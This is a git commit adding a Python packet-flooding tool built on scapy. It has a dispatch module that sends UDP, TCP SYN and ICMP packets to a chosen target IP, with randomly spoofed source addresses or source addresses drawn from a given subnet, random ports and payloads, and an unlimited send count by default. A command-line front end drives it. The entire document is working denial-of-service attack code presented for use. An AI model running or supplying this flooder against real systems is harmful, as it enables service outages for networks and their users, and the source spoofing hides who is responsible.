ff403b9610e8816399310a257e154c4d18206d20
mudonja <aljkavi007@gmail.com>
2020-06-30 23:13:48 -0400

    Adding flooder code - Veljko

---
+++ packetdispatch.py
@@ -0,0 +1,184 @@
+#! /usr/bin/env Python3
+#Base for the tool borowed from: https://github.com/celefthe/udp-flooder
+import socket
+import sys
+import random
+import os
+print(os.sys.path)
+from scapy.all import *
+import scapy
+from scapy import *
+import re
+#from random import getrandbits
+from ipaddress import IPv4Network, IPv4Address
+
+
+
+
+def sendUDPpackets(srcAddr,dstAddr, port, requests, size,packetcount):
+    source=str(srcAddr) #just in case to convert to string... it can probably be removed and srcAddr can be used instead
+    targ_addr = str(dstAddr)
+    targ_port = int(port)
+    targ_reqs = int(requests)
+    packet_size = int(size)
+    port_random=False
+    src_random=False
+    size_random=False
+    subnet_random=False
+
+#pak = IP(dst=target, src = "100.99.98.97", ttl=ttl, flags="DF", id=id, len=1200, chksum = 0)/
+#TCP(flags="S", sport=sport, dport=int(dport), options=[('Timestamp',(0,0))], chksum = 0)
+
+    if(int(port)==999999):
+        targ_port=1
+        #random.randrange(0,65535)
+        port_random=True
+
+    if(int(size)==999999):
+        packet_size=1
+        #int(random.randrange(0,65507))
+        size_random=True
+        payload = str("")
+    else:
+        payload=str(_generatePacket(packet_size))
+
+    pckt=IP(dst=targ_addr)/UDP(dport=targ_port)/payload
+
+    tmp='/' #this is used to search /8 /16 in the regex bellow
+    #pckt=IP()/UDP()/payload
+    if(source=="rand" or source=="random"):
+        pckt.src=socket.inet_ntoa(struct.pack('>I',random.randint(1,0xffffffff)))
+        src_random=True
+    elif(re.search(tmp,source)):
+        try:
+            #print("\nTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEST\n")
+            subnet = IPv4Network(source)
+            bits = random.getrandbits(subnet.max_prefixlen - subnet.prefixlen)
+            pckt.src=str(IPv4Address(subnet.network_address + bits))
+            #pckt.src = str(addr)
+            subnet_random=True
+
+        except ValueError:
+            print("Something is wrong! packet dispatch ")
+
+    else:
+        pckt.src=source
+        #print(source)
+    #implement requests
+    #print(str(subnet_random))
+    send_mod(pckt,loop=1,port_random_flag=port_random,size_random_flag=size_random,src_random_flag=src_random,specific_subnet_random=subnet_random,source_addr=source,count=targ_reqs,pcktcount=packetcount)
+    return
+
+def sendTCPpackets(srcAddr,dstAddr, port, requests, size,flags,packetcount):
+    source=str(srcAddr) #just in case to convert to string... it can probably be removed and srcAddr can be used instead
+    targ_addr = str(dstAddr)
+    targ_port = int(port)
+    targ_reqs = int(requests)
+    packet_size = int(size)
+    packet_flags=str(flags)
+    port_random=False
+    src_random=False
+    size_random=False
+    subnet_random=False
+
+#pak = IP(dst=target, src = "100.99.98.97", ttl=ttl, flags="DF", id=id, len=1200, chksum = 0)/
+#TCP(flags="S", sport=sport, dport=int(dport), options=[('Timestamp',(0,0))], chksum = 0)
+
+    if(int(port)==999999):
+        targ_port=1
+        #random.randrange(0,65535)
+        port_random=True
+
+    if(int(size)==999999):
+        packet_size=1
+        #int(random.randrange(0,65507))
+        size_random=True
+        payload = str("")
+    else:
+        payload=str(_generatePacket(packet_size))
+
+    pckt=IP(dst=targ_addr)/TCP(dport=targ_port,flags=packet_flags)/payload
+
+    tmp='/' #this is used to search /8 /16 in the regex bellow
+    if(source=="rand" or source=="random"):
+        pckt.src=socket.inet_ntoa(struct.pack('>I',random.randint(1,0xffffffff)))
+        src_random=True
+    elif(re.search(tmp,source)):
+        try:
+            #print("\nTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEST\n")
+            subnet = IPv4Network(source)
+            bits = random.getrandbits(subnet.max_prefixlen - subnet.prefixlen)
+            pckt.src=str(IPv4Address(subnet.network_address + bits))
+            #pckt.src = str(addr)
+            subnet_random=True
+
+        except ValueError:
+            print("Something is wrong! packet dispatch ")
+
+    else:
+        pckt.src=source
+        #print(source)
+    #implement requests
+    #print(str(subnet_random))
+    send_mod(pckt,loop=1,port_random_flag=port_random,size_random_flag=size_random,src_random_flag=src_random,specific_subnet_random=subnet_random,source_addr=source,count=targ_reqs,pcktcount=packetcount)
+    return
+
+def sendICMPpackets(srcAddr,dstAddr,requests,size,icmp_rand,packetcount):
+    source=str(srcAddr) #just in case to convert to string... it can probably be removed and srcAddr can be used instead
+    targ_addr = str(dstAddr)
+    targ_reqs = int(requests)
+    packet_size = int(size)
+    icmp_rand=int(icmp_rand)
+    #packet_flags=str(flags)
+    port_random=False
+    src_random=False
+    size_random=False
+    subnet_random=False
+
+
+    if(int(size)==999999):
+            packet_size=1
+            #int(random.randrange(0,65507))
+            size_random=True
+            payload = str("")
+    else:
+            payload=str(_generatePacket(packet_size))
+
+    pckt=IP(dst=targ_addr)/ICMP()/payload
+
+    tmp='/' #this is used to search /8 /16 in the regex bellow
+    if(source=="rand" or source=="random"):
+        pckt.src=socket.inet_ntoa(struct.pack('>I',random.randint(1,0xffffffff)))
+        src_random=True
+    elif(re.search(tmp,source)):
+        try:
+            subnet = IPv4Network(source)
+            bits = random.getrandbits(subnet.max_prefixlen - subnet.prefixlen)
+            pckt.src=str(IPv4Address(subnet.network_address + bits))
+            #pckt.src = str(addr)
+            subnet_random=True
+
+        except ValueError:
+            print("Something is wrong! packet dispatch ")
+
+    else:
+        pckt.src=source
+        #print(source)
+    #implement requests
+    #print(str(subnet_random))
+    send_mod(pckt,loop=1,src_random_flag=src_random,specific_subnet_random=subnet_random,source_addr=source,count=targ_reqs,size_random_flag=size_random,pcktcount=packetcount)
+    return
+
+def _generatePacket(size):
+    chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A',
+             'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
+             'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
+             'X', 'T', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
+             'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
+             'u', 'v', 'w', 'x', 'y', 'z']
+
+    packet = ""
+    for i in range(0, size):
+        packet += chars[random.randint(0, 60)]
+
+    return packet
---
+++ udpflooder.py
@@ -0,0 +1,111 @@
+#! /usr/bin/env Python3
+# Base for the tool borowed from: https://github.com/celefthe/udp-flooder
+import argparse
+import packetdispatch
+import time
+
+# Set default values
+DEFAULT_SRC_ADDR = "127.0.0.1"
+DEFAULT_PACKET_SIZE = 1500
+DEFAULT_CHKSUM = 0
+DEFAULT_PORT = 53
+DEFAULT_REQUEST_NUM = -1
+DEFAULT_TCP_FLAG = "S"
+#DEFAULT_ICMP_TYPE=8 #echo request
+#DEFAULT_ICMP_CODE=0
+DEFAULT_ICMP_TYPE_FLAG=0
+DEFAULT_PACKET_COUNT=500
+
+start = time.time()
+print("hello")
+end = time.time()
+print(end - start)
+def main():
+    # First parse the command line arguments
+    input_parser = argparse.ArgumentParser()
+
+    input_parser.add_argument("proto", nargs=1, help="Protocol(UDP or TCP or ICMP)")
+
+    input_parser.add_argument("dst", nargs=1, help="Target IP Address")
+
+    input_parser.add_argument("-src", "--source", type=str, nargs=1, default=DEFAULT_SRC_ADDR,
+                              help="Source IP Address(-src rand || -src random for randomly generated IP Addr)")
+
+    input_parser.add_argument("-p", "--port", type=int, nargs=1, default=DEFAULT_PORT,
+                              help="Target port (999999 for randomly generated port)")
+
+    input_parser.add_argument("-s", "--size", type=int, nargs=1, default=DEFAULT_PACKET_SIZE,
+                              help="Packet size (999999 for randomly generated payload")
+
+    input_parser.add_argument("--packetcount", type=int, nargs=1, default=DEFAULT_PACKET_COUNT,
+                              help="Packet size (999999 for randomly generated payload")
+
+    # input_parser.add_argument("-chk", "--checksum", type=int, nargs=1, default=DEFAULT_CHKSUM, help="Set a checksum value")
+
+    # TCP FLAG
+    input_parser.add_argument("-f", "--flag", type=str, nargs=1, default=DEFAULT_TCP_FLAG,
+                              help="Set a TCP flag. Options: S(YN), A(CK), F(IN), U(RG), P(SH), R(ST),E(CE),C(WR),N(S)[NS is an experimental flag,see RFC 3540]")
+    ## ICMP TYPE -not implemented-
+    ## input_parser.add_argument("-t", "--type", type=int, nargs=1,default=DEFAULT_ICMP_CODE, help="Specify ICMP packet type. ICMP TYPES and CODES: https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml")
+    ## ICMP CODE -not implemented-
+    ## input_parser.add_argument("-c", "--code", type=int, nargs=1,default=DEFAULT_ICMP_CODE, help="Specify ICMP packet type. ICMP TYPES and CODES: https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml")
+    ## ICMP RAND TYPE & CODE
+    input_parser.add_argument("-rtc", "--randomtypecode", type=int, nargs=1,default=DEFAULT_ICMP_TYPE_FLAG,
+                              help="Randomly generates ICMP packets of different type. 1 for ON, 0 for OFF. ICMP TYPES and CODES: https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml")
+    input_parser.add_argument("-req", "--requests", type=int, nargs=1, default=DEFAULT_REQUEST_NUM,
+                              help="Number of requests")
+    input_parser.add_argument("-r", "--rate", type=float, nargs=1, default=DEFAULT_REQUEST_NUM,
+                              help="packet sending rate(Can only slow down the rate [e.g 0.5 halfs sending rate])")
+    # pak = IP(dst=target, src = "100.99.98.97", ttl=ttl, flags="DF", id=id, len=1200, chksum = 0)/
+    # TCP(flags="S", sport=sport, dport=int(dport), options=[('Timestamp',(0,0))], chksum = 0)
+
+    args = input_parser.parse_args()
+    # protocol
+    protocol = str(args.proto).strip("[']")
+    # IP
+    dstAddr = str(args.dst).strip("[']")
+    srcAddr = str(args.source).strip("[']")
+    port = str(args.port).strip("[']")
+    # UDP
+    size = str(args.size).strip("[']")
+    # TCP
+    flags = str(args.flag).strip("[']")
+    #ICMP
+    icmp_rand=str(args.randomtypecode).strip("[']")
+    # number of requests
+    requests = str(args.requests).strip("[']")
+    rate = float(args.rate)
+    # not implemented yet...---^
+
+    # packet count timestamp
+    packetcount = str(args.packetcount).strip("[']")
+    # Display parameters to user
+    print("Protocol: " + protocol)
+    print("Target IP: " + dstAddr)
+    print("Target Port: " + port)
+    print("Packet Size: " + size)
+    if requests != '-1':
+        print("Number of Requests: " + requests)
+
+    print("\nSending packets...")
+
+    try:
+        if (protocol == "UDP"):
+            packetdispatch.sendUDPpackets(srcAddr, dstAddr, port, requests, size,packetcount)
+        elif (protocol == "TCP"):
+            packetdispatch.sendTCPpackets(srcAddr, dstAddr, port, requests, size, flags,packetcount)
+        elif(protocol=="ICMP"):
+            packetdispatch.sendICMPpackets(srcAddr, dstAddr, requests, size, icmp_rand,packetcount)
+        else:
+            print("Wrong/Unknown Protocol.")
+    except KeyboardInterrupt:
+        print('\nProcess cancelled by user')
+    # except:
+    #    print('\nError! Check parameters')
+    #time_elapsed = time.clock() - start_time
+
+    print("\nDone!")
+    #print("Time elapsed: " + str(time_elapsed) + " seconds")
+
+
+main()
